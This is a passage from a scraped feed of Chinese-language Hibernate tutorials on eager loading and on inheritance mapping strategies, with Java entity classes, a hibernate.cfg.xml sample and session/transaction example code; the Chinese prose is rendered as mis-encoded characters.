    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-keyword">public</span> Set&lt;Course&gt; <span class="hljs-title function_">getCourses</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> courses;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCourses</span><span class="hljs-params">(Set&lt;Course&gt; courses)</span> {
        <span class="hljs-built_in">this</span>.courses = courses;
    }
}
</code></pre>
<h5 data-id="heading-6">Course ç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Course</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@ManyToOne(fetch = FetchType.EAGER)</span>
    <span class="hljs-meta">@JoinColumn(name = "student_id")</span>
    <span class="hljs-keyword">private</span> Student student;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Course</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Course</span><span class="hljs-params">(String name, Student student)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.student = student;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Student <span class="hljs-title function_">getStudent</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> student;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStudent</span><span class="hljs-params">(Student student)</span> {
        <span class="hljs-built_in">this</span>.student = student;
    }
}
</code></pre>
<h3 data-id="heading-7">æ€¥åŠ è½½ç¤ºä¾‹ä»£ç </h3>
<p>ä¸‹é¢çš„ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•åœ¨å¹¶å‘ç¯å¢ƒä¸­ä½¿ç”¨æ€¥åŠ è½½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateEagerLoadingExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥ç¤ºä¾‹æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// ç¤ºä¾‹: ä½¿ç”¨æ€¥åŠ è½½åŠ è½½æ•°æ®</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            session = sessionFactory.openSession();
            transaction = session.beginTransaction();

            <span class="hljs-comment">// è·å–Studentå¯¹è±¡</span>
            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> session.get(Student.class, <span class="hljs-number">1L</span>);
            System.out.println(<span class="hljs-string">"Student: "</span> + student.getName() + <span class="hljs-string">", Age: "</span> + student.getAge());

            <span class="hljs-comment">// è®¿é—®æ€¥åŠ è½½çš„é›†åˆ</span>
            System.out.println(<span class="hljs-string">"Courses: "</span> + student.getCourses().size());
            <span class="hljs-keyword">for</span> (Course course : student.getCourses()) {
                System.out.println(<span class="hljs-string">"Course: "</span> + course.getName());
            }

            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">20</span>);
            <span class="hljs-type">Course</span> <span class="hljs-variable">course1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">"Mathematics"</span>, student);
            <span class="hljs-type">Course</span> <span class="hljs-variable">course2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">"Physics"</span>, student);
            student.getCourses().add(course1);
            student.getCourses().add(course2);
            session.save(student);
            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-8">è¯¦ç»†è§£é‡Š</h3>
<ol>
<li>
<p><strong>é…ç½®æ€¥åŠ è½½</strong>ï¼šåœ¨å®ä½“ç±»çš„å…³è”å­—æ®µä¸Šæ·»åŠ <code>fetch = FetchType.EAGER</code>æ³¨è§£ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@OneToMany(mappedBy = "student", fetch = FetchType.EAGER, cascade = CascadeType.ALL)</span>
<span class="hljs-keyword">private</span> Set&lt;Course&gt; courses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
</code></pre>
</li>
<li>
<p><strong>ç¤ºä¾‹åœºæ™¯</strong>ï¼š</p>
<ul>
<li>åœ¨ä¸€ä¸ªä¼šè¯ä¸­è·å–Studentå¯¹è±¡åŠå…¶å…³è”çš„Courseé›†åˆã€‚</li>
<li>æ€¥åŠ è½½ç­–ç•¥ä¼šåœ¨è·å–Studentå¯¹è±¡æ—¶ç«‹å³åŠ è½½å…¶å…³è”çš„Courseé›†åˆã€‚</li>
<li>è®¿é—®Studentå¯¹è±¡çš„Coursesé›†åˆæ—¶ï¼Œä¸éœ€è¦é¢å¤–çš„æ•°æ®åº“æŸ¥è¯¢ï¼Œå› ä¸ºå…³è”çš„Courseå¯¹è±¡å·²ç»åœ¨åŠ è½½Studentå¯¹è±¡æ—¶ä¸€èµ·åŠ è½½äº†ã€‚</li>
</ul>
</li>
<li>
<p><strong>äº‹åŠ¡ç®¡ç†</strong>ï¼šåœ¨äº‹åŠ¡ä¸­è¿›è¡Œæ•°æ®æ“ä½œï¼Œå¹¶åœ¨æ“ä½œå®Œæˆåæäº¤äº‹åŠ¡ã€‚å¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™å›æ»šäº‹åŠ¡ä»¥ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚</p>
</li>
</ol>
<h3 data-id="heading-9">æ€»ç»“</h3>
<p>æ€¥åŠ è½½æ˜¯ä¸€ç§æ•°æ®åŠ è½½ç­–ç•¥ï¼Œé€šè¿‡åœ¨åŠ è½½å®ä½“æ—¶ç«‹å³åŠ è½½å…¶å…³è”å®ä½“ï¼Œå‡å°‘äº†åœ¨åç»­è®¿é—®å…³è”æ•°æ®æ—¶çš„æ•°æ®åº“æŸ¥è¯¢æ¬¡æ•°ã€‚åœ¨Hibernateä¸­ï¼Œé€šè¿‡<code>fetch = FetchType.EAGER</code>æ³¨è§£å¯ä»¥æ–¹ä¾¿åœ°å®ç°æ€¥åŠ è½½ã€‚ç†è§£å¹¶æ­£ç¡®åº”ç”¨æ€¥åŠ è½½ï¼Œå¯ä»¥æœ‰æ•ˆåœ°æé«˜æŸ¥è¯¢æ•ˆç‡å’Œå‡å°‘æ•°æ®åº“è®¿é—®æ¬¡æ•°ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦é¢‘ç¹è®¿é—®å…³è”æ•°æ®çš„åœºæ™¯ä¸­ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ20ï¼‰Hibernateå¦‚ä½•å¤„ç†ç»§æ‰¿å…³ç³»ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7590020026395459638</link>    <guid>https://juejin.cn/post/7590020026395459638</guid>    <pubDate>2026-01-02T23:58:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026395459638" data-draft-id="7590654280899657771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ20ï¼‰Hibernateå¦‚ä½•å¤„ç†ç»§æ‰¿å…³ç³»ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T23:58:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ20ï¼‰Hibernateå¦‚ä½•å¤„ç†ç»§æ‰¿å…³ç³»ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T23:58:56.000Z" title="Fri Jan 02 2026 23:58:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernateæä¾›äº†å‡ ç§ç­–ç•¥æ¥å¤„ç†ç»§æ‰¿å…³ç³»ï¼Œä¸»è¦æœ‰ä¸‰ç§ï¼š</p>
<ol>
<li><strong>å•è¡¨ç»§æ‰¿ï¼ˆSingle Table Inheritanceï¼‰</strong>ï¼šåœ¨å•ä¸ªè¡¨ä¸­å­˜å‚¨ç»§æ‰¿å±‚æ¬¡ç»“æ„çš„æ‰€æœ‰ç±»ã€‚</li>
<li><strong>è¡¨è¿æ¥ç»§æ‰¿ï¼ˆJoined Table Inheritanceï¼‰</strong>ï¼šä¸ºæ¯ä¸ªç±»åˆ›å»ºç‹¬ç«‹çš„è¡¨ï¼Œå¹¶ä½¿ç”¨å¤–é”®å»ºç«‹å…³è”ã€‚</li>
<li><strong>è¡¨æ¯ç±»ç»§æ‰¿ï¼ˆTable Per Class Inheritanceï¼‰</strong>ï¼šä¸ºæ¯ä¸ªå…·ä½“ç±»åˆ›å»ºç‹¬ç«‹çš„è¡¨ï¼Œä¸å­˜å‚¨çˆ¶ç±»ä¿¡æ¯ã€‚</li>
</ol>
<p>ä¸‹é¢è¯¦ç»†ä»‹ç»è¿™ä¸‰ç§ç­–ç•¥ï¼Œå¹¶é€šè¿‡å…·ä½“çš„ç¤ºä¾‹ä»£ç æ¼”ç¤ºå¦‚ä½•åœ¨Hibernateä¸­å®ç°å®ƒä»¬ã€‚</p>
<h3 data-id="heading-0">å•è¡¨ç»§æ‰¿ï¼ˆSingle Table Inheritanceï¼‰</h3>
<p>åœ¨å•è¡¨ç»§æ‰¿ç­–ç•¥ä¸­ï¼Œç»§æ‰¿å±‚æ¬¡ç»“æ„çš„æ‰€æœ‰ç±»çš„å±æ€§å’Œæ•°æ®éƒ½å­˜å‚¨åœ¨åŒä¸€ä¸ªè¡¨ä¸­ï¼Œé€šè¿‡ä¸€ä¸ªåŒºåˆ†åˆ—ï¼ˆdiscriminator columnï¼‰æ¥åŒºåˆ†å…·ä½“çš„ç±»å‹ã€‚</p>
<h4 data-id="heading-1">ç¤ºä¾‹</h4>
<h5 data-id="heading-2">é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Person"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Employee"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h5 data-id="heading-3">å®ä½“ç±»</h5>
<h6 data-id="heading-4">çˆ¶ç±» <code>Person</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Inheritance(strategy = InheritanceType.SINGLE_TABLE)</span>
<span class="hljs-meta">@DiscriminatorColumn(name = "person_type", discriminatorType = DiscriminatorType.STRING)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }
}
</code></pre>
<h6 data-id="heading-5">å­ç±» <code>Employee</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.DiscriminatorValue;
<span class="hljs-keyword">import</span> javax.persistence.Entity;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@DiscriminatorValue("EMPLOYEE")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> salary;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> salary)</span> {
        <span class="hljs-built_in">super</span>(name);
        <span class="hljs-built_in">this</span>.salary = salary;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getSalary</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> salary;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSalary</span><span class="hljs-params">(<span class="hljs-type">double</span> salary)</span> {
        <span class="hljs-built_in">this</span>.salary = salary;
    }
}
</code></pre>
<h6 data-id="heading-6">å­ç±» <code>Student</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.DiscriminatorValue;
<span class="hljs-keyword">import</span> javax.persistence.Entity;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@DiscriminatorValue("STUDENT")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">private</span> String major;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, String major)</span> {
        <span class="hljs-built_in">super</span>(name);
        <span class="hljs-built_in">this</span>.major = major;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMajor</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> major;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMajor</span><span class="hljs-params">(String major)</span> {
        <span class="hljs-built_in">this</span>.major = major;
    }
}
</code></pre>
<h4 data-id="heading-7">æ’å…¥å’ŒæŸ¥è¯¢ç¤ºä¾‹ä»£ç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateSingleTableInheritanceExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// æŸ¥è¯¢æ•°æ®</span>
        queryData(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Employee</span> <span class="hljs-variable">employee</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">50000.0</span>);
            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"Jane Doe"</span>, <span class="hljs-string">"Computer Science"</span>);

            session.save(employee);
            session.save(student);

            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
